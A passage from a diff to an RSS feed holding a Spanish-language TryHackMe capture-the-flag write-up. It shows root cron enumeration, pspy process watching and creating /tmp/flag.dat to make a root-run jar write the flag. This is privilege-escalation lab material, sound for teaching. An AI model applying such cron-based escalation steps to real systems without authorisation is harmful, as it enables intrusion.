+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Realizamos una enumeracion en la maquina y encontramos dos cron que se ejecutan como usuario root&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;harry@ubuntu:~$ cat /etc/crontab 
+&lt;span class=&#34;c1&#34;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# command to install the new version when you edit this file&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# that none of the other crontabs do.&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/sh
+&lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+&lt;span class=&#34;c1&#34;&gt;# m h dom mon dow user	command&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; *	* * *	root    &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.hourly
+*  *	* * *	root	&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt/ &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash ufw.sh
+&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 6	* * *	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.daily &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; 6	* * 7	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; 6	&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; * *	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+*  *	* * *	root	&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root/java/ &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash run.sh
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;El primero ejecuta &lt;code&gt;ufw&lt;/code&gt;, el segundo al parecer &lt;em&gt;ejecuta algun archivo java&lt;/em&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash:/opt/ufw.sh&#34; data-lang=&#34;bash:/opt/ufw.sh&#34;&gt;ufw disable
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;pspy&lt;/code&gt; para ver que comandos se ejecutan tomando encuenta el segundo cron. Vemos que &lt;strong&gt;posiblemente&lt;/strong&gt; el archivo &lt;code&gt;run.sh&lt;/code&gt; ejecuta &lt;code&gt;java -jar root.jar&lt;/code&gt; que se encuentra en la carpeta &lt;code&gt;/root/java/&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_203059.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Si tomamos encuenta que el archivo &lt;code&gt;Example_Root.jar&lt;/code&gt; solo es un ejemplo, quizas el archivo &lt;code&gt;root.jar&lt;/code&gt; es el original y realiza la escritura en &lt;code&gt;/home/harry/root.txt&lt;/code&gt; de algun string y posiblemente nuestra flag &lt;code&gt;root.txt&lt;/code&gt;. Para comprobar esto vamos a crear el archivo &lt;code&gt;/tmp/flag.dat&lt;/code&gt; y esperar a que el cron se ejecute.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;touch /tmp/flag.dat
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_203812.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/aster/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/aster/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>uncompyle6</category>
+            
+          
+            
+              <category>gobuster</category>
+            
+          
+            
+              <category>asterisk</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+            
+              <category>metasploit</category>
+            
+          
+            
+              <category>telnet</category>
+            
+          
+            
+              <category>java</category>
+            
+          
+            
+              <category>jar</category>
+            
+          
+            
+              <category>pspy</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>TryHackMe - Fowsniff CTF</title>
